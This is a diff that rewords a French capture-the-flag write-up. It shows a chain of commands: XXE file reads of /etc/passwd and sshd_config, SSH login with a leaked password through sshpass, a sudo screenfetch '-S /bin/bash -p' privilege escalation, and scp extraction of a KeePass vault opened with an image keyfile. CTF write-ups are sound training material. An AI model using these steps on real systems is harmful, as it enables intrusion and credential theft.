@@ -47,9 +47,9 @@ On upload ce fichier via la deuxième option et on récupère le contenu de /etc
 
 ![Vuln](images/passwd1.png)
 
-On peut modifier l'archive manuellement à chaque fois que l'on veut tester une cible pour le path **XXE** mais c'est contraignant.
+Nous pouvons modifier l'archive manuellement à chaque fois que l'on veut tester une cible pour le path **XXE** mais c'est contraignant.
 
--- On automatise ce processus grâce à un script python :
+-- Automatisation de ce processus grâce à un script python :
 
 ```python
 import zipfile
@@ -111,9 +111,9 @@ print(f"\n Statut HTTP : {response.status_code}")
 print(" Réponse serveur :\n")
 print(response.text)
 ```
-> On cherche à obtenir un accès persistant à la machine — et l’accès SSH paraît être l’option la plus réaliste.
+> Il faudrait obtenir un accès persistant à la machine — l’accès SSH paraît être l’option la plus réaliste.
 
-On essaie de récupérer plusieurs fichiers systèmes comme les clés ssh mais on a une erreur qui signifie que nous n'avons pas les droits pour les lire.
+On essaie de récupérer plusieurs fichiers systèmes comme les clés ssh mais une erreur indique que nous n'avons pas les droits pour les lire.
 
 * On arrive dans un premier temps à récupérer la config OpenSSH avec le path "/etc/ssh/sshd_config" ce qui leak le port utilisé pour OpenSSH : **Port 22222**
 * Dans un second temps on récupère le hostname (document-station).
@@ -128,9 +128,9 @@ Celui-ci contient la commande :
 echo "cABdTXRyUj5qgAEl0Zc0a" >> /tmp/exec_ssh_password.tmp
 ```
 
-On peut donc déduire que **cABdTXRyUj5qgAEl0Zc0a** est le mot de passe d'un utilisateur, or ce n'est pas celui de document-user.
+Nous pouvons déduire que **cABdTXRyUj5qgAEl0Zc0a** est le mot de passe d'un utilisateur, or ce n'est pas celui de document-user.
 
-Le fichier passwd nous a également fuiter d'autres users, on en teste plusieurs avec ce mot de passe, on finit par trouver le bon **executor**.
+Le fichier passwd nous a également fuiter d'autres users, on en teste plusieurs avec ce mot de passe, on finit par trouver le bon, il s'agit de `executor`.
 
 ```
 sshpass -p 'cABdTXRyUj5qgAEl0Zc0a' ssh -p 22222 executor@163.172.67.183
@@ -151,7 +151,8 @@ User executor may run the following commands on document-station:
     (administrator) NOPASSWD: /usr/bin/screenfetch
 ```
 
-> On ne trouve pas forcément tout de suite comment escalader de privilèges mais on finit par y arriver, voici l'explication.
+>[!NOTE]
+> Il n'est pas forcément évident de trouver immédiatement comment escalader les privilèges, mais quelques recherches sur le binaire permettent d’y parvenir.
 
 - À première vue, screenfetch semble inoffensif (il sert juste à afficher des infos système), mais il accepte des options qui peuvent être détournées, notamment, avec l’option -S, avec laquelle il est possible d’exécuter une commande personnalisée :
 
@@ -161,14 +162,14 @@ sudo -u administrator /usr/bin/screenfetch -s -S '/bin/bash -p'
 
 - Ici, on utilise l’option -S pour exécuter `/bin/bash -p`, le flag `-p` (privileged mode) permet de conserver les privilèges de l’utilisateur avec lequel la commande est lancée — en l’occurrence administrator.
 
---> On ouvre donc un shell bash en tant que administrator en exploitant **cette erreur de configuration :**
+--> Cela permet de lancer un shell Bash en tant qu'administrator, en exploitant **cette erreur de configuration** :
 
 ![Brief](images/privesc.png)
 
 > [!NOTE]
 > Nous avons maintenant les droits de lecture sur ces deux fichiers mais nous avons un autre problème.
 
-Comment récupérer ces deux fichiers en local pour pouvoir les analyser sachant que nous n'avons pas les droits en écriture sur la plupart des dossiers (Read-only file system)
+Comment récupérer ces deux fichiers en local pour pouvoir les analyser sachant que nous n'avons pas les droits en écriture sur la plupart des dossiers ? (Read-only file system)
 
 - A la racine on repère un script "entrypoint.sh", voici son contenu :
 
@@ -192,15 +193,15 @@ cp /home/administrator/logo.jpg   /home/administrator/vault.kdbx  /dev/shm/
 chmod 644 /dev/shm/logo.jpg /dev/shm/vault.kdbx
 ```
 
---> On récupère les deux fichiers sur notre machine en local avec scp :
+--> Puis on récupère les deux fichiers sur notre machine en local avec scp :
 
 ```
 scp -P 22222 executor@163.172.67.183:/dev/shm/logo.jpg .
 scp -P 22222 executor@163.172.67.183:/dev/shm/vault.kdbx .
 ```
 
-- On ouvre le vault avec keepass mais on demande un password que l'on a pas, on peut également utiliser un **keyfile** pour le déverrouiller, on utilise donc l'image logo.png comme keyfile et ça marche !
-
+- KeePass permet d’ouvrir le vault, mais l’accès nécessite un mot de passe qui n’est pas disponible. Il est toutefois possible d’utiliser un keyfile pour le déverrouiller. L’image logo.png est utilisée comme keyfile et permet de dévérouiller le coffre-fort :
+  
 ![Flag](images/flag.png)
 
 **Flag:**
